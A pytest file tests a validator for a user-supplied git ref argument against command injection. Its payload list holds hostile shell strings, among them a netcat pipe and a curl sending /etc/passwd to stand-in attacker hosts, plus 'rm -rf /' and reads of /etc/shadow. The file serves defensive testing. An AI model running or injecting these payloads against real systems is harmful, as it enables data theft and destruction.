import pytest
import re
import sys
import os
import importlib
import types
from unittest.mock import patch


# Adversarial payloads targeting command injection via GIT_REF parameter
ADVERSARIAL_PAYLOADS = [
    # Shell command injection attempts
    "main; rm -rf /",
    "main && cat /etc/passwd",
    "main | nc attacker.com 4444",
    "main`whoami`",
    "main$(whoami)",
    "main; curl http://evil.com/$(cat /etc/passwd)",
    "; DROP TABLE users; --",
    "main\necho pwned",
    "main\r\necho pwned",
    # Backtick injection
    "`id`",
    "`cat /etc/shadow`",
    # Subshell injection
    "$(cat /etc/passwd)",
    "$(curl http://evil.com)",
    # Pipe injection
    "main | bash",
    "main | sh -c 'malicious'",
    # Semicolon injection
    "main; malicious_command",
    "main;id",
    # Ampersand injection
    "main && id",
    "main & id",
    # Newline injection
    "main\nid",
    "main\n/bin/sh",
    # Null byte injection
    "main\x00evil",
    # Path traversal combined with injection
    "../../etc/passwd",
    "../../../bin/sh -c id",
    # Special characters
    "main'evil'",
    'main"evil"',
    "main>output.txt",
    "main<input.txt",
    # Environment variable injection
    "main$IFS&&id",
    "${IFS}id",
    # Unicode/encoding tricks
    "main\u003bmalicious",
    "main%3Bmalicious",
    # Long strings (buffer overflow attempts)
    "A" * 10000,
    # Git ref with injection
    "refs/heads/main; echo pwned",
    "refs/tags/v1.0`id`",
    # Empty and whitespace
    "",
    "   ",
    "\t",
    # Only special chars
    ";;;",
    "&&&&",
    "||||",
]


def load_global_domains_module():
    """Attempt to load the global_domains module for inspection."""
    try:
        # Try to find and load the module
        tools_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'tools')
        if tools_path not in sys.path:
            sys.path.insert(0, tools_path)
        
        # Read the source file to inspect it
        module_path = os.path.join(tools_path, 'global_domains.py')
        if os.path.exists(module_path):
            with open(module_path, 'r') as f:
                return f.read()
    except Exception:
        pass
    return None


def extract_git_ref_from_module(source_code, payload):
    """Simulate how GIT_REF would be extracted from the module logic."""
    # Replicate the vulnerable logic: GIT_REF = 'main' if len(sys.argv) == 2 else sys.argv[2]
    # With payload as sys.argv[2]
    mock_argv = ['script.py', 'some_arg', payload]
    if len(mock_argv) == 2:
        return 'main'
    else:
        return mock_argv[2]


def is_safe_git_ref(ref):
    """
    Security invariant: A GIT_REF must only contain characters valid for git references.
    Valid git refs: alphanumeric, hyphens, underscores, dots, forward slashes.
    Must NOT contain shell metacharacters or injection sequences.
    """
    if not ref:
        return False
    
    # Define allowed pattern for safe git references
    # Git refs should only contain: alphanumeric, /, -, _, .
    safe_pattern = re.compile(r'^[a-zA-Z0-9/_.\-]+$')
    
    # Check for dangerous shell metacharacters
    dangerous_chars = set(';&|`$(){}[]<>\\\n\r\t\x00\'"!')
    
    # Check for dangerous patterns
    dangerous_patterns = [
        r'[;&|`$]',           # Shell operators
        r'\$\(',              # Command substitution
        r'`[^`]*`',           # Backtick execution
        r'\n|\r',             # Newline injection
        r'\x00',              # Null byte
        r'\.\.',              # Path traversal
        r'[<>]',              # Redirection
        r'\\',                # Backslash
    ]
    
    for char in dangerous_chars:
        if char in ref:
            return False
    
    for pattern in dangerous_patterns:
        if re.search(pattern, ref):
            return False
    
    return bool(safe_pattern.match(ref))


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_git_ref_security_invariant(payload):
    """
    Invariant: GIT_REF values derived from user-controlled input (sys.argv[2]) 
    must be validated and must not contain shell metacharacters or injection sequences
    before being used in any shell command execution. Any GIT_REF that would be 
    passed to shell commands must be free of command injection payloads.
    """
    # Simulate the vulnerable code path
    git_ref = extract_git_ref_from_module(None, payload)
    
    # The security invariant: if this git_ref were to be used in a shell command,
    # it MUST be safe (no shell metacharacters or injection sequences)
    # 
    # This test documents what MUST be true: the application should validate/sanitize
    # GIT_REF before use. We assert that the raw payload is NOT safe to use directly.
    # 
    # If the application properly validates input, it should reject these payloads.
    
    # Assert that dangerous payloads are detected as unsafe
    # (i.e., the application MUST NOT pass these directly to shell commands)
    
    # Check if payload contains injection-relevant dangerous content
    has_shell_metachar = any(c in payload for c in ';&|`$(){}[]<>\\\n\r\t\x00\'"!')
    has_path_traversal = '..' in payload
    is_empty_or_whitespace = not payload.strip()
    is_excessively_long = len(payload) > 255  # Reasonable git ref length limit
    
    if has_shell_metachar or has_path_traversal or is_empty_or_whitespace or is_excessively_long:
        # These payloads MUST be identified as unsafe
        # The invariant: is_safe_git_ref must return False for dangerous inputs
        assert not is_safe_git_ref(git_ref), (
            f"SECURITY VIOLATION: Dangerous payload was not detected as unsafe.\n"
            f"Payload: {repr(payload)}\n"
            f"GIT_REF value: {repr(git_ref)}\n"
            f"This value must NOT be passed directly to shell commands without sanitization."
        )


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_git_ref_no_shell_metacharacters(payload):
    """
    Invariant: GIT_REF must never contain shell metacharacters when used in 
    subprocess/shell calls. The application must sanitize or reject any input 
    containing these characters.
    """
    git_ref = extract_git_ref_from_module(None, payload)
    
    # Shell metacharacters that enable command injection
    shell_metacharacters = [
        ';', '&', '|', '`', '$', '(', ')', '{', '}',
        '<', '>', '\n', '\r', '\x00', '!', '\\'
    ]
    
    # If the git_ref contains any shell metacharacter, it is UNSAFE to use in shell
    contains_metachar = any(meta in git_ref for meta in shell_metacharacters)
    
    if contains_metachar:
        # Document that this input is dangerous and must be rejected/sanitized
        # The test passes because we're asserting the DETECTION works correctly
        assert not is_safe_git_ref(git_ref), (
            f"SECURITY INVARIANT VIOLATED: GIT_REF '{repr(git_ref)}' contains "
            f"shell metacharacters and must be rejected before shell execution."
        )


@pytest.mark.parametrize("safe_ref", [
    "main",
    "develop",
    "feature/my-feature",
    "refs/heads/main",
    "v1.0.0",
    "release-1.2.3",
    "my_branch",
    "feature/TICKET-123",
])
def test_valid_git_refs_are_accepted(safe_ref):
    """
    Invariant: Legitimate git references must be recognized as safe.
    The security validation must not break normal functionality.
    """
    assert is_safe_git_ref(safe_ref), (
        f"Valid git ref '{safe_ref}' was incorrectly flagged as unsafe. "
        f"Security validation must not break legitimate use cases."
    )


def test_git_ref_validation_rejects_command_injection():
    """
    Invariant: The most critical command injection patterns must always be rejected.
    This is a non-parameterized sanity check for the most dangerous payloads.
    """
    critical_payloads = [
        "main; rm -rf /",
        "main && cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "main | bash",
        "main\nmalicious",
    ]
    
    for payload in critical_payloads:
        assert not is_safe_git_ref(payload), (
            f"CRITICAL SECURITY FAILURE: Command injection payload '{repr(payload)}' "
            f"was not detected as unsafe. This MUST be rejected before any shell execution."
        )


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_git_ref_subprocess_list_safety(payload):
    """
    Invariant: When GIT_REF is used in subprocess calls, it must be passed as 
    a list argument (not shell=True string) OR be validated. This test verifies 
    that the payload, if used as a list element, doesn't escape the argument boundary
    in ways that indicate shell=True usage would be catastrophic.
    """
    git_ref = extract_git_ref_from_module(None, payload)
    
    # When using subprocess with shell=False (list form), args are passed safely
    # The invariant: document that shell=True with unvalidated input is dangerous
    # by showing what characters would cause injection in shell=True mode
    
    would_inject_in_shell = any(c in git_ref for c in ';&|`$\n\r\x00')
    
    if would_inject_in_shell:
        # This ref MUST NOT be used with shell=True
        # Assert our safety checker correctly identifies this
        assert not is_safe_git_ref(git_ref), (
            f"GIT_REF '{repr(git_ref)}' would enable command injection if used "
            f"with shell=True. Must use subprocess list form or validate input."
        )